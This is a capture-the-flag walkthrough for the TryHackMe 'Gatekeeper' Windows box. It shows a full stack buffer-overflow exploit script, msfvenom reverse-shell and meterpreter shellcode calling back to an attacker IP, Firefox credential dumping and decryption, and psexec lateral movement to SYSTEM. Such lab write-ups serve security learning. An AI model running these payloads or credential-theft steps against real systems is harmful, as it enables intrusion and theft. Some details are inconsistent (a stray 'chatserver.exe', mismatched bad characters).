Gatekeeper
=========

This is a CTF on https://tryhackme.com

Buffer Overflow
=================

    - We Fuzz the executable.
    - We crash the app and get control of the EIP.
    - We locate the bad characters
    - We find and select a Jump Point
    - We then generate our payload code
    - We make sure to add our NOP sleds.
    - We exploit.

Port Scanning
=============

    ------------------------------------------------------------
            Threader 3000 - Multi-threaded Port Scanner          
                           Version 1.0.7                    
                       A project by The Mayor               
    ------------------------------------------------------------
    Enter your target IP address or URL here: 10.10.90.223
    ------------------------------------------------------------
    Scanning target 10.10.90.223
    Time started: 2022-10-12 19:12:07.583486
    ------------------------------------------------------------
    Port 135 is open
    Port 139 is open
    Port 445 is open
    Port 3389 is open
    Port 31337 is open
    Port 49161 is open
    Port 49162 is open
    Port 49155 is open
    Port 49153 is open
    Port 49154 is open
    Port scan completed in 0:00:23.205553
    ------------------------------------------------------------
    Threader3000 recommends the following Nmap scan:
    ************************************************************
    nmap -p135,139,445,3389,31337,49161,49162,49155,49153,49154 -sV -sC -T4 -Pn -oA 10.10.90.223 10.10.90.223
    ************************************************************
    Would you like to run Nmap or quit to terminal?
    ------------------------------------------------------------
    1 = Run suggested Nmap scan
    2 = Run another Threader3000 scan
    3 = Exit to terminal
    ------------------------------------------------------------
    Option Selection: 1
    nmap -p135,139,445,3389,31337,49161,49162,49155,49153,49154 -sV -sC -T4 -Pn -oA 10.10.90.223 10.10.90.223
    Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-12 19:12 BST
    Nmap scan report for 10.10.90.223
    Host is up (0.025s latency).
    PORT      STATE SERVICE        VERSION
    135/tcp   open  msrpc          Microsoft Windows RPC
    139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    3389/tcp  open  ms-wbt-server?
    | rdp-ntlm-info: 
    |   Target_Name: GATEKEEPER
    |   NetBIOS_Domain_Name: GATEKEEPER
    |   NetBIOS_Computer_Name: GATEKEEPER
    |   DNS_Domain_Name: gatekeeper
    |   DNS_Computer_Name: gatekeeper
    |   Product_Version: 6.1.7601
    |_  System_Time: 2022-10-12T18:15:24+00:00
    | ssl-cert: Subject: commonName=gatekeeper
    | Not valid before: 2022-10-11T18:10:40
    |_Not valid after:  2023-04-12T18:10:40
    |_ssl-date: 2022-10-12T18:15:30+00:00; +1s from scanner time.
    31337/tcp open  Elite?
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
    |     Hello
    |   GenericLines: 
    |     Hello 
    |     Hello
    |   GetRequest: 
    |     Hello GET / HTTP/1.0
    |     Hello
    |   HTTPOptions: 
    |     Hello OPTIONS / HTTP/1.0
    |     Hello
    |   Help: 
    |     Hello HELP
    |   Kerberos: 
    |     Hello !!!
    |   LDAPSearchReq: 
    |     Hello 0
    |     Hello
    |   LPDString: 
    |     Hello 
    |     default!!!
    |   RTSPRequest: 
    |     Hello OPTIONS / RTSP/1.0
    |     Hello
    |   SIPOptions: 
    |     Hello OPTIONS sip:nm SIP/2.0
    |     Hello Via: SIP/2.0/TCP nm;branch=foo
    |     Hello From: <sip:nm@nm>;tag=root
    |     Hello To: <sip:nm2@nm2>
    |     Hello Call-ID: 50000
    |     Hello CSeq: 42 OPTIONS
    |     Hello Max-Forwards: 70
    |     Hello Content-Length: 0
    |     Hello Contact: <sip:nm@nm>
    |     Hello Accept: application/sdp
    |     Hello
    |   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |_    Hello
    49153/tcp open  msrpc          Microsoft Windows RPC
    49154/tcp open  msrpc          Microsoft Windows RPC
    49155/tcp open  msrpc          Microsoft Windows RPC
    49161/tcp open  msrpc          Microsoft Windows RPC
    49162/tcp open  msrpc          Microsoft Windows RPC
    Host script results:
    | smb2-time: 
    |   date: 2022-10-12T18:15:24
    |_  start_date: 2022-10-12T18:10:39
    | smb2-security-mode: 
    |   210: 
    |_    Message signing enabled but not required
    | smb-os-discovery: 
    |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
    |   Computer name: gatekeeper
    |   NetBIOS computer name: GATEKEEPER\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2022-10-12T14:15:24-04:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 028ac6aa2213 (unknown)
    |_clock-skew: mean: 48m00s, deviation: 1h47m20s, median: 0s
    Nmap done: 1 IP address (1 host up) scanned in 177.27 seconds
    ------------------------------------------------------------
    Combined scan completed 

It seems like there is a strange server running on 31337 called Elite ?, lets see what we can find with SMB.

Enumerating Port 139/445 - SMB
===============================

First we list all Sharename's that are being hosted on the SMB client

    smbclient -L 10.10.90.223            
    Password for [WORKGROUP\sloppy]:
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
    Reconnecting with SMB1 for workgroup listing.
    do_connect: Connection to 10.10.90.223 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
    Unable to connect with SMB1 -- no workgroup available

We can see the Sharename 'Users' lets see what's in there

    smbclient \\\\10.10.90.223\\Users 
    Password for [WORKGROUP\sloppy]:
    Try "help" to get a list of possible commands.
    smb: \> dir
      .                                  DR        0  Fri May 15 02:57:08 2020
      ..                                 DR        0  Fri May 15 02:57:08 2020
      Default                           DHR        0  Tue Jul 14 08:07:31 2009
      desktop.ini                       AHS      174  Tue Jul 14 05:54:24 2009
      Share                               D        0  Fri May 15 02:58:07 2020
                    7863807 blocks of size 4096. 3876750 blocks available
    smb: \> cd Share
    smb: \Share\> dir
      .                                   D        0  Fri May 15 02:58:07 2020
      ..                                  D        0  Fri May 15 02:58:07 2020
      gatekeeper.exe                      A    13312  Mon Apr 20 06:27:17 2020
                    7863807 blocks of size 4096. 3876750 blocks available
    smb: \Share\> mget gatekeeper.exe
    Get file gatekeeper.exe? y
    getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (38.7 KiloBytes/sec) (average 38.7 KiloBytes/sec)
    smb: \Share\> 

Lets have a look at this gatekeeper.exe im more depth using Immunity Debugger and Netcat

Mona Config / Immunity Debugger
================================

Now that we have the Files we can transfer both files to the Windows 7 VM that has immunity Debugger.

    Right-click the Immunity Debugger icon on the Windows 7 VM and choose "Run as administrator".

I use the mona script, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

    !mona config -set workingfolder c:\mona\%p

The latest version can be downloaded here: https://github.com/corelan/mona

Open the gatekeeper.exe and have a look at how it functions

On your Kali box, connect to port 31337 on 192.168.133.131 using netcat: 

    nc 192.168.133.131 31337
    hello
    Hello hello!!!
    hello   
    Hello hello!!!
    HELLO HELLO
    Hello HELLO HELLO!!!

Now make sure to keep an eye on the exe its self so you can create a fuzzer

Fuzzing
=======

The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application.

    #!/usr/bin/env python3
    import socket, time, sys
     
    ip = "127.0.0.1"
    port = 31337
     
    # Create an array of increasing length buffer strings.
    buffer = ['A']
    counter = 50
    while len(buffer) < 30:
        buffer.append("A" * counter)
        counter += 50
    for string in buffer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connect = s.connect((ip, port))
            print("Fuzzing with %s bytes" % len(string))
            s.send(string + "\r\n")
            s.recv(1024)
        except:
            print("Could not connect to " + ip + ":" + str(port))
            sys.exit(0)

Note I ran this on the windows 7 VM

The fuzzer will send increasingly long strings comprised of A's. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.

Crash Replication & Controlling EIP
===================================

Create another file on your Kali box called exploit.py with the following contents:

    import socket
    
    ip = "10.10.70.232"
       port = 31337

    prefix = ""
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    payload = ""
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    byte_message = bytes(buffer, "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((ip, port))
        print("Sending evil buffer...")
        s.send(byte_message + b"\r\n")
        print("Done!")
    except:
        print("Could not connect.")

Using the buffer length which caused the crash, generate a unique buffer so we can determine the offset in the pattern which overwrites the EIP register, and the offset in the pattern to which other registers point. Create a pattern that is 400 bytes larger than the crash buffer, so that we can determine whether our shellcode can fit immediately. If the larger buffer doesn't crash the application, use a pattern equal to the crash buffer length and slowly add more to the buffer to find space.

Fuzzing crashed at 150 bytes

    msf-pattern_create -l 450
      
    a0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9

On Windows, in Immunity Debugger, re-open the chatserver.exe again using the same method as before, and click the red play icon(twice) to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

While the unique buffer is on the stack, use mona's findmsp command, with the distance argument set to the pattern length.

    !mona findmsp -distance 450
    ...
    [+] Looking for cyclic pattern in memory
    EIP contains normal pattern : 0x39654138 (offset 146)

Equally you can also use msf-pattern_offeset

    msf-pattern_offset -q 39654138 
    [] Exact match at offset 146                        

Now lets Create a new buffer using this information to ensure that we can control EIP:

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

    prefix = ""
    offset = 146
    overflow = "A" * offset
    retn = "BBBB"
    padding = ""
    payload = ""
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    
Crash the application using this buffer, and make sure that EIP is overwritten by B's (\\x42)e.g. 42424242.

Finding Bad Characters
======================

Generate a bytearray using mona, and exclude the null byte (\\x00) by default. Note the location of the bytearray.bin file that is generated.

    !mona bytearray -b "\x00"

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \\x01 to \\xff:

    from __future__ import print_function

    for x in range(1, 256):
        print("\\x" + "{:02x}".format(x), end='')

    print()

Crash the application using this buffer, and make a note of the address to which ESP points. This can change every time you crash the application, so get into the habit of copying it from the register each time.

Use the mona compare command to reference the bytearray you generated, and the address to which ESP points:

    !mona compare -f C:\mona\gatekeeper\bytearray.bin -a <address>

We take note of the badchars returned:

    00 0A

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

Our new Mona byarray command will look like this:

    !mona bytearray -b "\x00\x0A"

We repeat the badchar comparison until the results status returns “Unmodified”. This indicates that no more badchars exist. This means executing the expliot, running the Mona-look-for-bad-chars-command, if there are new badchars we run mona-generate-new-bytearray-excluding-new-badchards-command, update the exploit

Find a Jump Point
=================

The mona jmp command can be used to search for jmp (or equivalent) instructions to a specific register. The jmp command will, by default, ignore any modules that are marked as aslr or rebase.

The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \\x00, \\x0a, and \\x0d.

    !mona jmp -r esp -cpb "\x00\x0a\x80"

Choose an address and update your exploit.py script, setting the “retn” variable to the address, written backwards. For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

    Our address is 080414c3 so our retn = "xc3\x14\x04\x08"

Generate Payload
================

Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:

    msfvenom -p windows/shell_reverse_tcp LHOST=10.18.91.23 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x80" -f py
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 11 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 351 (iteration=0)
    x86/shikata_ga_nai chosen with final size 351
    Payload size: 351 bytes
    Final size of py file: 1745 bytes

    buf =  b""
    buf += b"\xd9\xe8\xbe\x9c\xb1\xf6\xf8\xd9\x74\x24\xf4\x58"
    buf += b"\x33\xc9\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\xec"
    buf += b"\xa2\x14\x0d\xf0\x2d\x5a\xee\x08\xae\x3b\x66\xed"
    buf += b"\x9f\x7b\x1c\x66\x8f\x4b\x56\x2a\x3c\x27\x3a\xde"
    buf += b"\xb7\x45\x93\xd1\x70\xe3\xc5\xdc\x81\x58\x35\x7f"
    buf += b"\x02\xa3\x6a\x5f\x3b\x6c\x7f\x9e\x7c\x91\x72\xf2"
    buf += b"\xd5\xdd\x21\xe2\x52\xab\xf9\x89\x29\x3d\x7a\x6e"
    buf += b"\xf9\x3c\xab\x21\x71\x67\x6b\xc0\x56\x13\x22\xda"
    buf += b"\xbb\x1e\xfc\x51\x0f\xd4\xff\xb3\x41\x15\x53\xfa"
    buf += b"\x6d\xe4\xad\x3b\x49\x17\xd8\x35\xa9\xaa\xdb\x82"
    buf += b"\xd3\x70\x69\x10\x73\xf2\xc9\xfc\x85\xd7\x8c\x77"
    buf += b"\x89\x9c\xdb\xdf\x8e\x23\x0f\x54\xaa\xa8\xae\xba"
    buf += b"\x3a\xea\x94\x1e\x66\xa8\xb5\x07\xc2\x1f\xc9\x57"
    buf += b"\xad\xc0\x6f\x1c\x40\x14\x02\x7f\x0d\xd9\x2f\x7f"
    buf += b"\xcd\x75\x27\x0c\xff\xda\x93\x9a\xb3\x93\x3d\x5d"
    buf += b"\xb3\x89\xfa\xf1\x4a\x32\xfb\xd8\x88\x66\xab\x72"
    buf += b"\x38\x07\x20\x82\xc5\xd2\xe7\xd2\x69\x8d\x47\x82"
    buf += b"\xc9\x7d\x20\xc8\xc5\xa2\x50\xf3\x0f\xcb\xfb\x0e"
    buf += b"\xd8\xfe\xe9\x4b\x0f\x97\x0f\x6b\x3e\x3b\x99\x8d"
    buf += b"\x2a\xd3\xcf\x06\xc3\x4a\x4a\xdc\x72\x92\x40\x99"
    buf += b"\xb5\x18\x67\x5e\x7b\xe9\x02\x4c\xec\x19\x59\x2e"
    buf += b"\xbb\x26\x77\x46\x27\xb4\x1c\x96\x2e\xa5\x8a\xc1"
    buf += b"\x67\x1b\xc3\x87\x95\x02\x7d\xb5\x67\xd2\x46\x7d"
    buf += b"\xbc\x27\x48\x7c\x31\x13\x6e\x6e\x8f\x9c\x2a\xda"
    buf += b"\x5f\xcb\xe4\xb4\x19\xa5\x46\x6e\xf0\x1a\x01\xe6"
    buf += b"\x85\x50\x92\x70\x8a\xbc\x64\x9c\x3b\x69\x31\xa3"
    buf += b"\xf4\xfd\xb5\xdc\xe8\x9d\x3a\x37\xa9\xbe\xd8\x9d"
    buf += b"\xc4\x56\x45\x74\x65\x3b\x76\xa3\xaa\x42\xf5\x41"
    buf += b"\x53\xb1\xe5\x20\x56\xfd\xa1\xd9\x2a\x6e\x44\xdd"
    buf += b"\x99\x8f\x4d"

Prepend NOPs
============

If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\\x90) to the payload.

    padding = "\x90" * 16

Final Buffer (Shell Exploit)
============================

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell. Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn’t change it).

    nc - lvnp 4444
    listening on [any] 4444 ...

Restart gatekeeper.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!

    sudo nc -lvnp 4444      
    [sudo] password for sloppy: 
    listening on [any] 4444 ...
    connect to [10.18.91.23] from (UNKNOWN) [10.10.134.192] 49173
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Users\gatekeeper\Desktop>

Now that we have POC, change the IP in the exploit to the target and set up listener again. run the exploit again.

    sudo nc -lvnp 4444      
    [sudo] password for sloppy: 
    listening on [any] 4444 ...
    connect to [10.18.91.23] from (UNKNOWN) [10.10.134.192] 49173
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Users\natbat\Desktop>more user.txt.txt
    more user.txt.txt
    {First Flag found here}

Privilege Escalation
====================

Lets upgrade our shell to a meterpreter session and use some post exploits in msfconsole. Lets make a new payload with msfvenom for the exploit.

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.91.23 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x80" -f py
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    Found 11 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 402 (iteration=0)
    x86/shikata_ga_nai chosen with final size 402
    Payload size: 402 bytes
    Final size of py file: 1993 bytes

    buf =  b""
    buf += b"\xba\xb8\x5b\xdd\x28\xdb\xdf\xd9\x74\x24\xf4\x5d"
    buf += b"\x31\xc9\xb1\x5e\x31\x55\x15\x83\xed\xfc\x03\x55"
    buf += b"\x11\xe2\x4d\xa7\x35\xa7\xad\x58\xc6\xd8\x9c\x8a"
    buf += b"\x4f\xfd\xba\xa1\x02\xce\xc9\xe4\xae\xa5\x9f\x1c"
    buf += b"\xa0\x0e\x55\x3b\x8f\x8f\xe2\x31\xc7\x5e\x34\x19"
    buf += b"\x2b\xc0\xc8\x60\x78\x22\xf1\xaa\x8d\x23\x36\x7d"
    buf += b"\xfb\xcc\xea\x29\x88\x41\x1a\x5d\xcc\x59\x1b\xb1"
    buf += b"\x5a\xe1\x63\xb4\x9d\x96\xdf\xb7\xcd\x07\x54\xef"
    buf += b"\xcd\xa6\xb9\x9b\x46\xb1\xb8\x55\x22\xfd\xf3\x9a"
    buf += b"\x82\x76\xc7\xef\x14\x5f\x16\x30\xd7\x90\x55\x1c"
    buf += b"\xd9\xe9\x5d\xbc\xaf\x01\x9e\x41\xa8\xd1\xdd\x9d"
    buf += b"\x3d\xc6\x45\x55\xe5\x22\x74\xba\x70\xa0\x7a\x77"
    buf += b"\xf6\xee\x9e\x86\xdb\x84\x9a\x03\xda\x4a\x2b\x57"
    buf += b"\xf9\x4e\x70\x03\x60\xd6\xdc\xe2\x9d\x08\xb8\x5b"
    buf += b"\x38\x42\x2a\x8d\x3c\xab\xb5\xb2\x60\x3c\x7a\x7f"
    buf += b"\x9b\xbc\x14\x08\xe8\x8e\xbb\xa2\x66\xa3\x34\x6d"
    buf += b"\x70\xb2\x52\x8e\xae\x7c\x32\x70\x4f\x7d\x1b\xb7"
    buf += b"\x1b\x2d\x33\x1e\x24\xa6\xc3\x9f\xf1\x53\xc9\x37"
    buf += b"\xf0\xb1\x96\xd0\x6c\xb4\x28\xce\x30\x31\xce\xa0"
    buf += b"\x98\x11\x5e\x01\x49\xd2\x0e\xe9\x83\xdd\x71\x09"
    buf += b"\xac\x37\x1a\xa0\x43\xee\x73\x5d\xfd\xab\x0f\xfc"
    buf += b"\x02\x66\x6a\x3e\x88\x83\x8b\xf1\x79\xe1\x9f\xe6"
    buf += b"\x1d\x09\x5f\xf7\x8b\x09\x35\xf3\x1d\x5d\xa1\xf9"
    buf += b"\x78\xa9\x6e\x01\xaf\xa9\x68\xfd\x2e\x98\x03\xc8"
    buf += b"\xa4\xa4\x7b\x35\x29\x25\x7b\x63\x23\x25\x13\xd3"
    buf += b"\x17\x76\x06\x1c\x82\xea\x9b\x89\x2d\x5b\x48\x19"
    buf += b"\x46\x61\xb7\x6d\xc9\x9a\x92\xed\x0e\x64\x61\xda"
    buf += b"\xb6\x0d\x99\x5a\x47\xce\xf3\x5a\x17\xa6\x08\x74"
    buf += b"\x98\x06\xf1\x5f\xf1\x0e\x78\x0e\xb3\xaf\x7d\x1b"
    buf += b"\x15\x6e\x7e\xa8\x8e\x81\x05\xc1\x31\x62\xfa\xcb"
    buf += b"\x55\x62\xfb\xf3\x6b\x5e\x2a\xca\x19\xa1\xef\x69"
    buf += b"\x01\x3c\xc5\x87\xaa\x99\x8c\x25\xb7\x19\x7b\x69"
    buf += b"\xce\x99\x89\x12\x35\x81\xf8\x17\x71\x05\x11\x6a"
    buf += b"\xea\xe0\x15\xd9\x0b\x21"

Now our exploit is ready lets set up multi handler meterpreter and run the exploit again.

    msf6 > use exploit/multi/handler
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 10.18.91.23
    LHOST => 10.18.91.23
    msf6 exploit(multi/handler) > set LPORT 4444
    LPORT => 4444
    msf6 exploit(multi/handler) > exploit -j
    [*] Exploit running as background job 0.
    [*] Exploit completed, but no session was created.

    msf6 exploit(multi/handler) > sessions -i 3
    [*] Starting interaction with 3...
    meterpreter > 

We are now ready to enumerate on meterpreter

    meterpreter > run post/windows/gather/enum_applications
    [*] Enumerating applications installed on GATEKEEPER
    Installed Applications
    ======================
     Name                                                                Version
     ----                                                                -------
     Amazon SSM Agent                                                    2.3.842.0
     Amazon SSM Agent                                                    2.3.842.0
     EC2ConfigService                                                    4.9.4222.0
     EC2ConfigService                                                    4.9.4222.0
     EC2ConfigService                                                    4.9.4222.0
     EC2ConfigService                                                    4.9.4222.0
     Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
     Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
     Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
     Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
     Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
     Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
     Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
     Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
     Mozilla Firefox 75.0 (x86 en-US)                                    75.0
    [+] Results stored in: /home/sloppy/.msf4/loot/20221014124411_default_10.10.134.192_host.application_727443.txt

We see Mozilla Firefox is being run by the local user so we try and gather the creds with this post exploit

    meterpreter > run post/multi/gather/firefox_creds 
    [-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?
    [*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\
    [*] Profile: 

    C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
    [+] Downloaded cert9.db: /home/sloppy/.msf4/loot/20221014124456_default_10.10.134.192_ff.ljfn812a.cert_302365.bin
    [+] Downloaded cookies.sqlite: /home/sloppy/.msf4/loot/20221014124456_default_10.10.134.192_ff.ljfn812a.cook_688255.bin
    [+] Downloaded key4.db: /home/sloppy/.msf4/loot/20221014124457_default_10.10.134.192_ff.ljfn812a.key4_588555.bin
    [+] Downloaded logins.json: /home/sloppy/.msf4/loot/20221014124458_default_10.10.134.192_ff.ljfn812a.logi_239746.bin

    [*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default
    meterpreter > 

Now that credentials are dumped, users will be required to grab the Firefox Decrypt tool from Github (https://github.com/unode/firefox_decryp) Instructions are provided on the page, but in short, users will be required to rename the four different outputs from the Firefox_cred module.

After renaming the four files (hint use the above post to see what to rename them too, then run the firefox_decrypt)

    python3 firefox_decrypt.py /home/sloppy/.msf4/loot/
    2022-10-14 13:28:33,046 - WARNING - profile.ini not found in /home/sloppy/.msf4/loot/
    2022-10-14 13:28:33,046 - WARNING - Continuing and assuming '/home/sloppy/.msf4/loot/' is a profile location

    Website:   https://creds.com
    Username: 'mayor'
    Password: '8CL7O1N78MdrCIsV'

Now we can use psexec.py to try gain access, first lets find it on our local kali system

    locate psexec.py                                   
    /usr/share/doc/python3-impacket/examples/psexec.py
    /usr/share/powershell-empire/empire/server/modules/powershell/lateral_movement/invoke_psexec.py
    /usr/share/set/src/fasttrack/psexec.py
                                                                                                                                                                                                                                                
    ┌──(sloppy㉿kali)-[~/Downloads/Gatekeeper]
    └─$ cd /usr/share/doc/python3-impacket/examples/

Now lets use the credintials we have and see if they work

    python psexec.py mayor:8CL7O1N78MdrCIsV@10.10.134.192
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

    [*] Requesting shares on 10.10.134.192.....
    [*] Found writable share ADMIN$
    [*] Uploading file UEUzLQKC.exe
    [*] Opening SVCManager on 10.10.134.192.....
    [*] Creating service LbjL on 10.10.134.192.....
    [*] Starting service LbjL.....
    [!] Press help for extra shell commands
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Windows\system32> whoami
    nt authority\system

    C:\Windows\system32> 

Conclusion
==========

This box took me nearly 3 days to complete, I used alot of resources online and plenty of trial and error, hope you enjoyed this and it helps.
